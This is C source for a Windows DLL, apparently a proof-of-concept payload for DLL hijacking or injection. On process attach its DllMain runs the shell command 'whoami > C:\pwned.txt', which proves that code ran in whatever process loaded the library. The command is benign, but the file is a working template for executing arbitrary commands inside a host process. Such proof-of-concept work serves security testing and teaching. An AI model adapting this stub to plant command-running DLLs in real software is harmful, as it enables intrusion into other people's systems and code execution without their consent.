#include <stdlib.h>
#include <stdio.h>

BOOL APIENTRY DllMain(	HMODULE hModule,
						DWORD  ul_reason_for_call,
						LPVOID lpReserved) {
	switch (ul_reason_for_call) {
		case DLL_PROCESS_ATTACH:
			printf("-- PROCESS ATTACHED --\n");
			system("whoami > C:\\pwned.txt");
			printf("File created at C:\\pwned.txt\n");
		case DLL_THREAD_ATTACH:
			printf("-- THREAD ATTACHED --\n");
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}
